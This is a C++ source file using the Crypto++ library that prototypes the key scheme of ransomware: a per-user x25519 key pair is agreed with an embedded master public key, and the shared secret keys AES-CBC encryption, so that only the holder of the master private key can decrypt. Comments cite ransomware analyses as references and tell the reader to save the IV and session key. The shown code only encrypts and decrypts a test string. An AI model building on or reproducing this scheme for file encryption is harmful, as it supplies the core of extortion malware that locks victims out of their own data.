// Asymmetric (xed25519) + symmetric (AES)
// How to encrypt: AES key = ecdh.agree(master public key + User private key) + random generated IV
// How to decrypt: Get session ecdh key by using the private master key and public ecdh session key from user
// The session correct session key can be use as the AES decryption key with the saved IV to decrypt file correctly

// Please Save AES IV, public ecdh session key, encrypted bytes
// Public master key should be already embedded somewhere in the program

// Before compile please:
// VC++ Directory -> Include Directory -> Add crpyto++ folder
// Linker -> Input -> Additional Dpeendencies -> Add fullpath of "cryptlib.lib"
// C/C++ -> Code Generation -> Runtime Library -> Change to "Multi-Threaded (MT)"

// References for crypto thingy:
// https://unit42.paloaltonetworks.com/ransom-cartel-ransomware/
// https://securelist.com/a-new-generation-of-ransomware/64608/

#include <iostream>
#include <fstream>
#include "cryptlib.h"
#include "xed25519.h"
#include "osrng.h"
#include "files.h"
#include "hex.h"
#include "rijndael.h"

#include <string>
using std::string;

#include "filters.h"
using CryptoPP::StringSink;
using CryptoPP::StringSource;
using CryptoPP::StreamTransformationFilter;

#include "aes.h"
using CryptoPP::AES;

#include "modes.h"
using CryptoPP::ECB_Mode;

int main()
{
    using namespace CryptoPP;
    HexEncoder encoder(new FileSink(std::cout));

    AutoSeededRandomPool prng;
    x25519 ecdhUsr(prng);

    // Load master public key
    std::ifstream pb_fin("master_pb.bin", std::ios::binary);
    std::vector<unsigned char> master_pb_loaded(std::istreambuf_iterator<char>(pb_fin), {});
    pb_fin.close();
    SecByteBlock master_pb_key_sb(reinterpret_cast<const unsigned char*>(master_pb_loaded.data()), 0x20);
    std::cout << "Master public key: ";
    StringSource(master_pb_key_sb, master_pb_key_sb.size(), true, new Redirector(encoder));
    std::cout << std::endl;

    // Generate key pair from user
    SecByteBlock pkUsr(ecdhUsr.PrivateKeyLength());
    SecByteBlock pbUsr(ecdhUsr.PublicKeyLength());
    ecdhUsr.GenerateKeyPair(prng, pkUsr, pbUsr);
    std::cout << "Priv User: ";
    StringSource(pkUsr, pkUsr.size(), true, new Redirector(encoder));
    std::cout << std::endl;

    std::cout << "Pub User: ";
    StringSource(pbUsr, pbUsr.size(), true, new Redirector(encoder)); // Save this later
    std::cout << std::endl;

    SecByteBlock sharedKeyUsr(ecdhUsr.AgreedValueLength());

    // When decrypt agree(pkUsr, master_pb_key_sb) == agree(master_pk_key_sb, pbUsr) is a must to ensure same session key is used next steps
    if (!ecdhUsr.Agree(sharedKeyUsr, pkUsr, master_pb_key_sb))
        throw std::runtime_error("Failed to reach shared secret");

    std::cout << "Shared secret: ";
    StringSource(sharedKeyUsr, sharedKeyUsr.size(), true, new Redirector(encoder));
    std::cout << std::endl;

    // AES CBC Encrypt/Decrypt
    SecByteBlock iv(AES::BLOCKSIZE);
    prng.GenerateBlock(iv, iv.size()); // IV needs to be save later if we want decrypt the file later
    std::string plain = "CBC Mode Test";
    std::string cipher, recovered;

    try
    {
        CBC_Mode< AES >::Encryption e;
        e.SetKeyWithIV(sharedKeyUsr, sharedKeyUsr.size(), iv);

        StringSource s(plain, true,
            new StreamTransformationFilter(e,
                new StringSink(cipher)
            )
        );
    }
    catch (const Exception& e)
    {
        std::cerr << e.what() << std::endl;
        exit(1);
    }

    std::cout << "key: ";
    encoder.Put(sharedKeyUsr, sharedKeyUsr.size());
    encoder.MessageEnd();
    std::cout << std::endl;

    std::cout << "iv: ";
    encoder.Put(iv, iv.size());
    encoder.MessageEnd();
    std::cout << std::endl;

    std::cout << "cipher text: ";
    encoder.Put((const byte*)&cipher[0], cipher.size());
    encoder.MessageEnd();
    std::cout << std::endl;

    // AES Decryption
    try
    {
        CBC_Mode< AES >::Decryption d;
        d.SetKeyWithIV(sharedKeyUsr, sharedKeyUsr.size(), iv);

        StringSource s(cipher, true,
            new StreamTransformationFilter(d,
                new StringSink(recovered)
            ) // StreamTransformationFilter
        ); // StringSource

        std::cout << "recovered text: " << recovered << std::endl;
    }
    catch (const Exception& e)
    {
        std::cerr << e.what() << std::endl;
        exit(1);
    }

    return 0;
}
